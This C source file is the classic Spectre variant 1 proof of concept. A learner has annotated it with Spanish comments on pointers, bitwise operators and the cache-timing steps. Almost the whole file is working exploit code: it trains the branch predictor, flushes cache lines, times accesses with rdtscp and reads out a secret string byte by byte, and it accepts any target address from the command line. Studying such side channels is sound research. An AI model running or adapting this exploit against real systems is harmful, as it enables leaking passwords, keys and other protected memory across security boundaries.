#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
//uintN_t: Son typedefs que representan un unsignedinteger en N bits exactos
//uint8_t Value range 0 to 255. Tamaño real 1byte=8bits
//int8_t Value range -128 to 127
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512]; //131072 de tamaño, cada posicion es numero de 8 bits

/*Punteros: es un variable que contiene la dirección de otra variable.
Cuando una variable puntero es definida, el nombre de la var tiene que ir precedido
de un *. Este identifica que la variable es un puntero.
	
	tipo * identificador = valor; //El puntero sería ese id
	Operadores: 
		*: Acceso al contenido
		&: Obtención de la dirección
	
	Ej:
	int * x; //Variable puntero
	int z=*x; //z = al contenido de x.
	*x = 10 //se cambia a 10
	aumentar(&x) //Para pasar un puntero por parametros se pone la dirección fisica


*/
char* secret = "The Magic Words are Squeamish Ossifrage.";//secret es un puntero a la frase.

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

//size_t se usa para representar el tamaño de un objeto, por ejemplo, 
//strlen devuelve un numero de tipo size_t con el tamaño de (char arr[])=string en c
void victim_function(size_t x)
{
	if (x < array1_size)//esta dentro del tamaño 16
	{
		temp &= array2[array1[x] * 512]; //temp=temp&array2[array1[x] * 512] 	temp=00000000&...=0
	}
}
/*
  Operadores a nivel de bits, aplicados a enteros. 105 Dec->01101001 Bin son 8bits
  En memoria se almacena el dato en binario 
  & AND binario 00=0,01=0,10=0,11=1  01101001 & 00001001=1001 
  | OR binario  00=0,01=1,10=1,11=1  01101001 | 00001011=01101011
  ^ XOR binario 00=0,01=1,10=1,11=0
  << n Desplz izq 011001<<2 = 01100100. Desplaza y rellena con ceros. Multiplica
  >> n Desplz der 011001>>2 = 00011001. Desplaza y rellena con ceros. Divide
  Por o div entre 2 dependiendo del n
  ~  Complemento a 1 001~110
  x = x & 0x01;
  x &= 0x01;
*/

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold (limite) */

/* Report best guess(campeon) in value[0] and runner-up(subcampeon) in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) //parametros de leerByteMemoria son tamaño de malicious_x, y dos arrays de tam3
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;

	/*
	Las variables registro le dicen al compilador que almacene la variable en el registro de la CPU en lugar de la memoria.  
	Las variables de uso frecuente se guardan en registros y tienen un acceso más rápido.
	Nunca podemos obtener las direcciones de estas variables. ¿Con Spectre 3a se podría obtener? IMPORTANTE
	La palabra clave "registro" se utiliza para declarar las variables de registro.
	Lifetime − Till the end of the execution of the block in which it is defined.
	*/
	register uint64_t time1, time2;

	/*
	volatile es una palabra clave que debe aplicarse al declarar cualquier variable que haga referencia a un registro.
	Sin el uso de volatile,	el optimizador de tiempo de compilación puede eliminar accesos importantes sin darse cuenta. 
	Si no se usa volatile, se pueden generar errores que son difíciles de rastrear.
	Le indica al compilador que use la semántica exacta para los objetos declarados, en particular, que no elimine ni reordene los accesos al objeto.
	*/
	volatile uint8_t* addr;


	for (i = 0; i < 256; i++)		results[i] = 0; //Inicializa array results, tam 256, 256 bits/8 =32Bytes, creo.

	for (tries = 999; tries > 0; tries--)//Intentos.
	{

		/*Los datos se transfieren mediante cache lines/cache blocks de 64Bytes a traves de las caches y la memoria principal
		
		*/
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); 
			//Flush de 8 bits por iteración. array2 cap 131072. Hace 256 iteraciones 0*512=0index, 2*512=1024index,..., 255*512=130560index 
			//Elimina el valor del indice 13560 que son 8 bits. Se pone la direccion& porque la func es así y se pasa por referencia para que sea modificado realmente.

			/* 
			intrinsic for clflush instruction. 
			Invalidates and flushes the cache line that contains from all levels of the cache hierarchy.
			_mm_cflush(*const u8)
			*/
			
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x), se ha decidido entrenar así*/
		training_x = tries%array1_size; //999%16=7 ,..., 991%16=15
		for (j = 29; j >= 0; j--) //Se esta entrenando el Branch Predictor
		{
			_mm_clflush(&array1_size);//flush de cache a la variable de array1_size
			for (volatile int z = 0; z < 100; z++){} /* Delay (can also mfence)=mfence */

			/* Manipulacion de bits para poner x=training_x si j%6!=0. 29%6=5,...,25%6=1, Van 5 de train, 24%6=0, Va 1 de malicious */
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */

			/* Avoid jumps in case those tip off the branch predictor */
			/* Evitar saltos que puedan alertar/dar una pista al predictor de salto*/

			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
										// el . significa más ..F..
			/*
			                    0xFFFF=1111 1111 1111 1111
			~(0xFFFF)=ffffffffffff0000
			j=29. x = 0000.0100 AND ~(ffffffffffff0000)=0
			j=24, x = -1 AND ~(0xFFFF)=ffffffffffff0000
			*/

			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}
		/*
		The stride value predictor is a technology that eases the data dependency, a factor restricting program parallelism. 
		This mechanism predicts the values that the instruction generates by using a Value History Table (VHT).
		*/
		/*
		Time reads. Order is lightly mixed up to prevent stride prediction.
		Ha cambiado el orden de acceder a las posiciones del array, multiplicando y haciendo una mascara (&255) para coger los valores importantes.
		Se cronometra cada acceso al array2 y se guarda en results sumando 1 cada vez que hay hit de la cache.
		 */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			//i=3,514=1000000010 & 11111111 = 00.10 Bi = 2Dec
			addr = &array2[mix_i * 512]; //addr= array2[1024], antes se ha hecho flush, y ahora el punt addr va a esa posición
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME, se accede al array, que antes se hizo flush, para ver el tiempo. */ 
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; 
				/* 
				Cache hit. Add +1 to score for this value.
				Si se hace cache hit y el tiempo es menor que el limite(threshold), se suma uno a la posición que ha hecho hit.
				*/
		}

		/* Locate highest & second-highest results results tallies in j/k */
		/*Localiza los dos valores más altos. Los que más cache hits han dado.*/
		j = k = -1;
		for (i = 0; i < 256; i++){
			if (j < 0 || results[i] >= results[j]){
				k = j;
				j = i;
			}else if (k < 0 || results[i] >= results[k]){
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;//Guarda mejor valor. Indice.
	score[0] = results[j];//Guarda mejor resultado. Numero de cache hits.
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char* * argv)
{
	/*
	int argc: argumento cuenta
	char** argv: Vector de vectores (puntero a punteros)
	Un vector es realmente un puntero a la posisión de memoria
	int v[0]=*(v+0)
	int v[1]=*(v+4)
	Son argumentos de llamada. Que sirven para acceder a los parametros de la consola de comandos. 
	>format c: -> argc es el numero de parametros (2= format y c:) y argv es el vector que tiene vectores de caracteres (format c:).
	argv[0]=format argv[0][0]=f, argv[1]=c: 
	*/
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));//secreto en direccion %p
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];//Array de tam 2

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3){
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x)); //%p para imprimir punteros 
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}
	/*
	sscanf_s(const char *buffer, const char *format [, argument]=prinf ); 	Lee datos con formato de una cadena.
	*/

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}
